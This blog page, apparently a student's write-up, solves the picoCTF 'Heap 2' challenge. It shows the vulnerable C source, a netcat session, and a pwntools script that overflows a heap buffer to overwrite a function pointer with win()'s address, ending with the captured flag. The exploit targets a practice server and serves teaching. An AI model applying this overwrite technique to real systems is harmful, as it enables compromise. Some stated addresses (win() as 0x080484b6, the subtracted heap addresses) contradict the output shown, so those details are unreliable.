@@ -1,0 +1,299 @@
+<!doctype html>
+<html lang="en" data-scheme="river" data-schemes="river">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>PicoCTF: Heap 2 · river</title>
+    <meta name="description" content="Utilizing a buffer overflow payloads to override pointers">
+    <meta name="author" content="river">
+    <link rel="canonical" href="https://rivers.sh/posts/picoctf-heap2/">
+    <meta property="og:site_name" content="river">
+    <meta property="og:title" content="PicoCTF: Heap 2">
+    <meta property="og:description" content="Utilizing a buffer overflow payloads to override pointers">
+    <meta property="og:url" content="https://rivers.sh/posts/picoctf-heap2/">
+    <meta property="og:type" content="article">
+    <meta property="og:image" content="https://rivers.sh/images/og.jpg">
+    <meta name="twitter:card" content="summary">
+    <link rel="icon" href="/images/favicon.svg" type="image/svg+xml">
+    <link rel="alternate" type="application/atom+xml" title="river" href="/atom.xml">
+    <link rel="preload" href="/fonts/MesloLGS-Regular.ttf" as="font" type="font/ttf" crossorigin>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/syntax.css">
+    <script>
+    // Runs before first paint: restore the visitor's colour scheme and pick the
+    // background art, so neither flashes in after load.
+    (function () {
+      var d = document.documentElement;
+      try {
+        var s = localStorage.getItem("scheme");
+        if (s && d.getAttribute("data-schemes").split(" ").indexOf(s) !== -1) d.setAttribute("data-scheme", s);
+      } catch (e) {}
+      var art = ["/images/art/art1.jpg"];
+      if (!art.length) return;
+      var i = Math.floor(Math.random() * art.length);
+      try {
+        // don't show the same art twice in a row
+        var last = parseInt(localStorage.getItem("art-last"), 10);
+        if (art.length > 1 && i === last) i = (i + 1 + Math.floor(Math.random() * (art.length - 1))) % art.length;
+        localStorage.setItem("art-last", i);
+      } catch (e) {}
+      var a = typeof art[i] === "string" ? { src: art[i] } : art[i];
+      d.style.setProperty("--art", 'url("' + a.src + '")');
+      d.style.setProperty("--art-pos", a.position || "right bottom");
+      d.setAttribute("data-art", "");
+    })();
+    </script>
+</head>
+<body class="is-post">
+    <a class="skip-link" href="#main">skip to content</a>
+    <div class="page">
+        <header class="site-header">
+    <a class="site-title" href="/">river</a>
+    <nav class="site-nav" aria-label="site">
+        <ul><li><a href="/">home</a></li><li><a href="/blog/">blog</a></li><li><a href="/categories/">categories</a></li><li><a href="/tags/">tags</a></li><li><a href="/search/">search</a></li></ul>
+    </nav>
+</header>
+
+        <main id="main">
+<article class="post h-entry">
+    <header class="post-header">
+        <h1 class="post-title p-name">PicoCTF: Heap 2</h1>
+        <!-- no whitespace between items: the "|" separators supply the spacing -->
+        <div class="post-meta"><time class="dt-published" datetime="2024-10-22">Oct 22, 2024</time><span>4 min read</span><span class="post-cats"><a href="/categories/ctf/">CTF</a> › <a href="/categories/ctf/picoctf2024/">picoCTF2024</a> › <a href="/categories/ctf/picoctf2024/medium/">Medium</a></span><span class="post-tags"><a class="p-category" href="/tags/buffer-overflow/">#Buffer Overflow</a> <a class="p-category" href="/tags/binary-exploitation/">#Binary Exploitation</a></span></div>
+        <p class="post-description p-summary">Utilizing a buffer overflow payloads to override pointers</p>
+    </header>
+
+    
+    <details class="toc toc-inline">
+        <summary>contents</summary>
+        <nav aria-label="contents"><ol><li class="toc-h2"><a href="#challenge-info">Challenge Info</a></li><li class="toc-h2"><a href="#understanding-challc">Understanding chall.c</a></li><li class="toc-h2"><a href="#vulnerabilities">Vulnerabilities</a></li><li class="toc-h2"><a href="#connecting-to-the-netcat-listener">Connecting to the netcat listener</a></li><li class="toc-h2"><a href="#the-plan">The Plan</a></li><li class="toc-h2"><a href="#solution">Solution</a></li></ol></nav>
+    </details>
+    
+
+    <div class="prose e-content" tabindex="-1">
+
+<hr />
+<h2 id="challenge-info"><a href="#challenge-info" class="anchor">#</a>Challenge Info</h2>
+<p>Can you handle function pointers? Downloads the binary <a href="https://artifacts.picoctf.net/c_mimas/49/chall" target="_blank" rel="noopener">here</a>. Downloads the source <a href="https://artifacts.picoctf.net/c_mimas/49/chall.c" target="_blank" rel="noopener">here</a>.</p>
+<p>Additional details will be available after launching your challenge instance.</p>
+<h2 id="understanding-challc"><a href="#understanding-challc" class="anchor">#</a>Understanding chall.c</h2>
+<p>The code for your convenience:</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#define FLAGSIZE_MAX </span><span class="dv">64</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> num_allocs<span class="op">;</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="dt">char</span> <span class="op">*</span>x<span class="op">;</span></span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a><span class="dt">char</span> <span class="op">*</span>input_data<span class="op">;</span></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> win<span class="op">()</span> <span class="op">{</span></span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Print flag</span></span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> buf<span class="op">[</span>FLAGSIZE_MAX<span class="op">];</span></span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a>    <span class="dt">FILE</span> <span class="op">*</span>fd <span class="op">=</span> fopen<span class="op">(</span><span class="st">&quot;flag.txt&quot;</span><span class="op">,</span> <span class="st">&quot;r&quot;</span><span class="op">);</span></span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a>    fgets<span class="op">(</span>buf<span class="op">,</span> FLAGSIZE_MAX<span class="op">,</span> fd<span class="op">);</span></span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;</span><span class="sc">%s\n</span><span class="st">&quot;</span><span class="op">,</span> buf<span class="op">);</span></span>
+<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a>    fflush<span class="op">(</span>stdout<span class="op">);</span></span>
+<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a>    exit<span class="op">(</span><span class="dv">0</span><span class="op">);</span></span>
+<span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb1-21"><a href="#cb1-21" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-22"><a href="#cb1-22" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> check_win<span class="op">()</span> <span class="op">{</span> <span class="op">((</span><span class="dt">void</span> <span class="op">(*)())*(</span><span class="dt">int</span><span class="op">*)</span>x<span class="op">)();</span> <span class="op">}</span></span>
+<span id="cb1-23"><a href="#cb1-23" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-24"><a href="#cb1-24" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> print_menu<span class="op">()</span> <span class="op">{</span></span>
+<span id="cb1-25"><a href="#cb1-25" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;</span><span class="sc">\n</span><span class="st">1. Print Heap</span><span class="sc">\n</span><span class="st">2. Write to buffer</span><span class="sc">\n</span><span class="st">3. Print x</span><span class="sc">\n</span><span class="st">4. Print Flag</span><span class="sc">\n</span><span class="st">5. &quot;</span></span>
+<span id="cb1-26"><a href="#cb1-26" aria-hidden="true" tabindex="-1"></a>           <span class="st">&quot;Exit</span><span class="sc">\n\n</span><span class="st">Enter your choice: &quot;</span><span class="op">);</span></span>
+<span id="cb1-27"><a href="#cb1-27" aria-hidden="true" tabindex="-1"></a>    fflush<span class="op">(</span>stdout<span class="op">);</span></span>
+<span id="cb1-28"><a href="#cb1-28" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb1-29"><a href="#cb1-29" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-30"><a href="#cb1-30" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> init<span class="op">()</span> <span class="op">{</span></span>
+<span id="cb1-31"><a href="#cb1-31" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-32"><a href="#cb1-32" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;</span><span class="sc">\n</span><span class="st">I have a function, I sometimes like to call it, maybe you should change it</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-33"><a href="#cb1-33" aria-hidden="true" tabindex="-1"></a>    fflush<span class="op">(</span>stdout<span class="op">);</span></span>
+<span id="cb1-34"><a href="#cb1-34" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-35"><a href="#cb1-35" aria-hidden="true" tabindex="-1"></a>    input_data <span class="op">=</span> malloc<span class="op">(</span><span class="dv">5</span><span class="op">);</span></span>
+<span id="cb1-36"><a href="#cb1-36" aria-hidden="true" tabindex="-1"></a>    strncpy<span class="op">(</span>input_data<span class="op">,</span> <span class="st">&quot;pico&quot;</span><span class="op">,</span> <span class="dv">5</span><span class="op">);</span></span>
+<span id="cb1-37"><a href="#cb1-37" aria-hidden="true" tabindex="-1"></a>    x <span class="op">=</span> malloc<span class="op">(</span><span class="dv">5</span><span class="op">);</span></span>
+<span id="cb1-38"><a href="#cb1-38" aria-hidden="true" tabindex="-1"></a>    strncpy<span class="op">(</span>x<span class="op">,</span> <span class="st">&quot;bico&quot;</span><span class="op">,</span> <span class="dv">5</span><span class="op">);</span></span>
+<span id="cb1-39"><a href="#cb1-39" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb1-40"><a href="#cb1-40" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-41"><a href="#cb1-41" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> write_buffer<span class="op">()</span> <span class="op">{</span></span>
+<span id="cb1-42"><a href="#cb1-42" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;Data for buffer: &quot;</span><span class="op">);</span></span>
+<span id="cb1-43"><a href="#cb1-43" aria-hidden="true" tabindex="-1"></a>    fflush<span class="op">(</span>stdout<span class="op">);</span></span>
+<span id="cb1-44"><a href="#cb1-44" aria-hidden="true" tabindex="-1"></a>    scanf<span class="op">(</span><span class="st">&quot;</span><span class="sc">%s</span><span class="st">&quot;</span><span class="op">,</span> input_data<span class="op">);</span></span>
+<span id="cb1-45"><a href="#cb1-45" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb1-46"><a href="#cb1-46" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-47"><a href="#cb1-47" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> print_heap<span class="op">()</span> <span class="op">{</span></span>
+<span id="cb1-48"><a href="#cb1-48" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;[*]   Address   -&gt;   Value   </span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-49"><a href="#cb1-49" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;+-------------+-----------+</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-50"><a href="#cb1-50" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;[*]   </span><span class="sc">%p</span><span class="st">  -&gt;   </span><span class="sc">%s\n</span><span class="st">&quot;</span><span class="op">,</span> input_data<span class="op">,</span> input_data<span class="op">);</span></span>
+<span id="cb1-51"><a href="#cb1-51" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;+-------------+-----------+</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-52"><a href="#cb1-52" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;[*]   </span><span class="sc">%p</span><span class="st">  -&gt;   </span><span class="sc">%s\n</span><span class="st">&quot;</span><span class="op">,</span> x<span class="op">,</span> x<span class="op">);</span></span>
+<span id="cb1-53"><a href="#cb1-53" aria-hidden="true" tabindex="-1"></a>    fflush<span class="op">(</span>stdout<span class="op">);</span></span>
+<span id="cb1-54"><a href="#cb1-54" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb1-55"><a href="#cb1-55" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-56"><a href="#cb1-56" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">(</span><span class="dt">void</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb1-57"><a href="#cb1-57" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-58"><a href="#cb1-58" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Setup</span></span>
+<span id="cb1-59"><a href="#cb1-59" aria-hidden="true" tabindex="-1"></a>    init<span class="op">();</span></span>
+<span id="cb1-60"><a href="#cb1-60" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-61"><a href="#cb1-61" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> choice<span class="op">;</span></span>
+<span id="cb1-62"><a href="#cb1-62" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-63"><a href="#cb1-63" aria-hidden="true" tabindex="-1"></a>    <span class="cf">while</span> <span class="op">(</span><span class="dv">1</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb1-64"><a href="#cb1-64" aria-hidden="true" tabindex="-1"></a>        print_menu<span class="op">();</span></span>
+<span id="cb1-65"><a href="#cb1-65" aria-hidden="true" tabindex="-1"></a>	<span class="cf">if</span> <span class="op">(</span>scanf<span class="op">(</span><span class="st">&quot;</span><span class="sc">%d</span><span class="st">&quot;</span><span class="op">,</span> <span class="op">&amp;</span>choice<span class="op">)</span> <span class="op">!=</span> <span class="dv">1</span><span class="op">)</span> exit<span class="op">(</span><span class="dv">0</span><span class="op">);</span></span>
+<span id="cb1-66"><a href="#cb1-66" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-67"><a href="#cb1-67" aria-hidden="true" tabindex="-1"></a>        <span class="cf">switch</span> <span class="op">(</span>choice<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb1-68"><a href="#cb1-68" aria-hidden="true" tabindex="-1"></a>        <span class="cf">case</span> <span class="dv">1</span><span class="op">:</span></span>
+<span id="cb1-69"><a href="#cb1-69" aria-hidden="true" tabindex="-1"></a>            <span class="co">// print heap</span></span>
+<span id="cb1-70"><a href="#cb1-70" aria-hidden="true" tabindex="-1"></a>            print_heap<span class="op">();</span></span>
+<span id="cb1-71"><a href="#cb1-71" aria-hidden="true" tabindex="-1"></a>            <span class="cf">break</span><span class="op">;</span></span>
+<span id="cb1-72"><a href="#cb1-72" aria-hidden="true" tabindex="-1"></a>        <span class="cf">case</span> <span class="dv">2</span><span class="op">:</span></span>
+<span id="cb1-73"><a href="#cb1-73" aria-hidden="true" tabindex="-1"></a>            write_buffer<span class="op">();</span></span>
+<span id="cb1-74"><a href="#cb1-74" aria-hidden="true" tabindex="-1"></a>            <span class="cf">break</span><span class="op">;</span></span>
+<span id="cb1-75"><a href="#cb1-75" aria-hidden="true" tabindex="-1"></a>        <span class="cf">case</span> <span class="dv">3</span><span class="op">:</span></span>
+<span id="cb1-76"><a href="#cb1-76" aria-hidden="true" tabindex="-1"></a>            <span class="co">// print x</span></span>
+<span id="cb1-77"><a href="#cb1-77" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;</span><span class="sc">\n\n</span><span class="st">x = </span><span class="sc">%s\n\n</span><span class="st">&quot;</span><span class="op">,</span> x<span class="op">);</span></span>
+<span id="cb1-78"><a href="#cb1-78" aria-hidden="true" tabindex="-1"></a>            fflush<span class="op">(</span>stdout<span class="op">);</span></span>
+<span id="cb1-79"><a href="#cb1-79" aria-hidden="true" tabindex="-1"></a>            <span class="cf">break</span><span class="op">;</span></span>
+<span id="cb1-80"><a href="#cb1-80" aria-hidden="true" tabindex="-1"></a>        <span class="cf">case</span> <span class="dv">4</span><span class="op">:</span></span>
+<span id="cb1-81"><a href="#cb1-81" aria-hidden="true" tabindex="-1"></a>            <span class="co">// Check for win condition</span></span>
+<span id="cb1-82"><a href="#cb1-82" aria-hidden="true" tabindex="-1"></a>            check_win<span class="op">();</span></span>
+<span id="cb1-83"><a href="#cb1-83" aria-hidden="true" tabindex="-1"></a>            <span class="cf">break</span><span class="op">;</span></span>
+<span id="cb1-84"><a href="#cb1-84" aria-hidden="true" tabindex="-1"></a>        <span class="cf">case</span> <span class="dv">5</span><span class="op">:</span></span>
+<span id="cb1-85"><a href="#cb1-85" aria-hidden="true" tabindex="-1"></a>            <span class="co">// exit</span></span>
+<span id="cb1-86"><a href="#cb1-86" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb1-87"><a href="#cb1-87" aria-hidden="true" tabindex="-1"></a>        <span class="cf">default</span><span class="op">:</span></span>
+<span id="cb1-88"><a href="#cb1-88" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;Invalid choice</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-89"><a href="#cb1-89" aria-hidden="true" tabindex="-1"></a>            fflush<span class="op">(</span>stdout<span class="op">);</span></span>
+<span id="cb1-90"><a href="#cb1-90" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb1-91"><a href="#cb1-91" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb1-92"><a href="#cb1-92" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<ul>
+<li>Defines a constant for the max size of the flag string (<code>FLAGSIZE_MAX</code>).</li>
+<li>Two char pointers are declared: <code>x</code> is used to store a string, <code>input_data</code> stores user input- each being 5 bytes of size.</li>
+<li>A <code>win()</code> function is declared. It reads the flag from a file (<code>flag.txt</code>) and prints it for us. It uses a buffer to store said flag, and ensures that it doesn't exceed <code>FLAGSIZE_MAX</code></li>
+<li>A <code>check_win()</code> is declared. It executes a function at the address stored in the <code>x</code> pointer.</li>
+<li>The <code>init()</code> function allocates memory for <code>input_data</code> and <code>x</code>, and initializes them with the strings "pico" and "bico" respectively.</li>
+<li>The <code>write_buffer()</code> function asks the use for input, which the function will then store in <code>input_data</code> using <code>scanf</code> (recall that <code>scanf</code> is unsafe, as it does not check for buffer overflows).</li>
+</ul>
+<h2 id="vulnerabilities"><a href="#vulnerabilities" class="anchor">#</a>Vulnerabilities</h2>
+<p>There's several vulnerabilities to note:</p>
+<ul>
+<li>The <code>write_buffer()</code> function is using <code>scanf</code> to read user input. <code>scanf</code> is unsecure and can be overflowed.</li>
+<li>The <code>input_data</code> and <code>x</code> buffer are allocated to hold only 5 bytes (4 bytes and then a null character)</li>
+<li>The <code>check_win()</code> function executes code at the memory address being stored in <code>x</code>.</li>
+</ul>
+<h2 id="connecting-to-the-netcat-listener"><a href="#connecting-to-the-netcat-listener" class="anchor">#</a>Connecting to the netcat listener</h2>
+<pre class="terminal"><code>&gt; nc mimas.picoctf.net 55662
+
+I have a function, I sometimes like to call it, maybe you should change it
+
+1. Print Heap
+2. Write to buffer
+3. Print x
+4. Print Flag
+5. Exit
+
+Enter your choice: 1
+[*]   Address   -&gt;   Value
++-------------+-----------+
+[*]   0x18572b0  -&gt;   pico
++-------------+-----------+
+[*]   0x18572d0  -&gt;   bico
+
+1. Print Heap
+2. Write to buffer
+3. Print x
+4. Print Flag
+5. Exit
+
+Enter your choice:</code></pre>
+<p>Again, <code>pico</code> and <code>bico</code> are the values inside the buffers (<code>input_data</code> &amp; <code>x</code> respectively) that were declared at the start. Again, the reason they're declared to be 5 bytes, is to leave 1 byte for the null character.</p>
+<p>Just like last time, we're given the addresses. The only thing that's different is that these are buffers instead of variables. Again, we'll subtract the address of <code>pico</code> with the address of <code>bico</code>.</p>
+<p><code>0x22b82b0 - 0x22b82d0 = -0x20</code>. When ran through <a href="https://gchq.github.io/CyberChef/#recipe=From_Hex(&#39;Auto&#39;)To_Decimal(&#39;Space&#39;,false)&amp;input=LTB4MjA" target="_blank" rel="noopener">cyber chef</a> (from hex to decimal) we get a value of 32. And because like last time, our initial hex value was negative, this means that <code>input_data</code> is 32 bytes behind <code>x</code>.</p>
+<h2 id="the-plan"><a href="#the-plan" class="anchor">#</a>The Plan</h2>
+<p>This now know that <code>input_data</code> is 32 bytes behind <code>x</code>. Additionally, we know that the <code>check_win()</code> function executes a function at the address stored in the <code>x</code> pointer. Finally we know that if a <code>win()</code> function is declared, it'll read us the flag.</p>
+<p><em>So, in short, we want to:</em> overflow to reach the <code>x</code> pointer, and then get it to hold a value identical to the address of the <code>win()</code> function, so that when <code>check_win()</code> is automatically ran, instead of executing <em>'bico'</em> at <code>x</code>, it will execute <code>win()</code>- thus giving us our flag.</p>
+<h2 id="solution"><a href="#solution" class="anchor">#</a>Solution</h2>
+<p>Before we write our payloads, we need to know the address corresponding to <code>win()</code>. A simple <a href="https://man7.org/linux/man-pages/man1/objdump.1.html" target="_blank" rel="noopener">objdump</a> will reveal this:</p>
+<pre class="terminal"><code>&gt; objdump -d ./chall | grep win
+00000000004011a0 &lt;win&gt;:
+00000000004011f0 &lt;check_win&gt;:</code></pre>
+<p>This now know that <code>win()</code> is at <code>0x080484b6</code>. <strong>However</strong>, because of C's memory layout, we need to consider C's memory layout. C uses a little-endian system to ensure that the least significant bytes are placed first. Because of this, we want to input the address of <code>win()</code> in little-endian order.</p>
+<p>Our payloads should look something like this:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode py"><code class="sourceCode python"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="co"># Connect to the remote service</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>p <span class="op">=</span> remote(<span class="st">&quot;mimas.picoctf.net&quot;</span>, <span class="dv">53827</span>)</span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="co"># Construct the payloads</span></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>payloads <span class="op">=</span> <span class="st">b&quot;AAAA&quot;</span> <span class="op">*</span> <span class="dv">8</span> <span class="op">+</span> <span class="st">b&quot;</span><span class="ch">\xa0\x11\x40\x00\x00\x00\x00\x00</span><span class="st">&quot;</span></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a><span class="co"># Send option &#39;2&#39; to allocate the object</span></span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>p.sendline(<span class="st">b&quot;2&quot;</span>)</span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a><span class="co"># Wait for the server to ask for the buffer input</span></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>p.recvuntil(<span class="st">b&quot;buffer:&quot;</span>)</span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a><span class="co"># Send the constructed payloads</span></span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a>p.sendline(payloads)</span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a><span class="co"># Wait for the next prompt (choice menu)</span></span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a>p.recvuntil(<span class="st">b&quot;choice:&quot;</span>)</span>
+<span id="cb4-20"><a href="#cb4-20" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-21"><a href="#cb4-21" aria-hidden="true" tabindex="-1"></a><span class="co"># Send option &#39;4&#39; to check for win condition</span></span>
+<span id="cb4-22"><a href="#cb4-22" aria-hidden="true" tabindex="-1"></a>p.sendline(<span class="st">b&quot;4&quot;</span>)</span>
+<span id="cb4-23"><a href="#cb4-23" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-24"><a href="#cb4-24" aria-hidden="true" tabindex="-1"></a><span class="co"># Print the final output (possibly the flag)</span></span>
+<span id="cb4-25"><a href="#cb4-25" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(p.recvall())</span></code></pre></div>
+<p>flag: <code>picoCTF{and_down_the_road_we_go_dde41590}</code></p>
+<hr />
+
+    </div>
+
+    <nav class="post-nav" aria-label="more posts">
+        <a class="prev" href="/posts/picoctf-heap1/" rel="prev"><span class="post-nav-label">‹ older</span>PicoCTF: Heap 1</a>
+        <a class="next" href="/posts/picoctf-heap3/" rel="next"><span class="post-nav-label">newer ›</span>picoCTF: Heap 3</a>
+    </nav>
+</article>
+
+<aside class="post-aside" aria-label="on this page">
+    <ul class="aside-actions">
+        <li><a href="/posts/picoctf-heap1/" title="older: PicoCTF: Heap 1" aria-label="older post">‹</a></li>
+        <li><a href="/posts/picoctf-heap3/" title="newer: picoCTF: Heap 3" aria-label="newer post">›</a></li>
+        <li><a href="#top" class="to-top" title="back to top" aria-label="back to top">↑</a></li>
+    </ul>
+    <nav class="toc toc-side" aria-label="contents"><ol><li class="toc-h2"><a href="#challenge-info">Challenge Info</a></li><li class="toc-h2"><a href="#understanding-challc">Understanding chall.c</a></li><li class="toc-h2"><a href="#vulnerabilities">Vulnerabilities</a></li><li class="toc-h2"><a href="#connecting-to-the-netcat-listener">Connecting to the netcat listener</a></li><li class="toc-h2"><a href="#the-plan">The Plan</a></li><li class="toc-h2"><a href="#solution">Solution</a></li></ol></nav>
+</aside>
+
+        </main>
+        <footer class="site-footer">
+    <span class="footer-left">
+        <span>&copy; 2024–2026 river</span>
+        <button type="button" class="contact-button" aria-controls="toast" data-label="email" data-value="Y29udGFjdEByaXZlcnMuc2g=">email</button><button type="button" class="contact-button" aria-controls="toast" data-label="signal" data-value="cml2LjEzMzc=">signal</button><button type="button" class="contact-button" aria-controls="toast" data-label="pgp" data-value="QzREQiAxMjc3IDJCQjUgNDY1NyBFQjM3IDQxODQgOEE3QSAwOTQyIDFEQjQgODE4Mg==">pgp</button>
+    </span>
+    <span class="footer-links">
+        <a href="/atom.xml">atom</a>
+        <button type="button" class="scheme-toggle" title="switch colour scheme">scheme: <span class="scheme-name">river</span></button>
+    </span>
+    <div class="toast" id="toast" role="status" aria-live="polite" hidden></div>
+</footer>
+
+    </div>
+    <script src="/js/main.js" defer></script>
+    
+    
+    <script>
+    // oneko chases the cursor, so skip it on touch screens
+    (function () {
+      if (!matchMedia("(hover: hover) and (pointer: fine)").matches) return;
+      var s = document.createElement("script");
+      s.src = "/js/oneko.js";
+      document.body.appendChild(s);
+    })();
+    </script>
+    
+</body>
+</html>
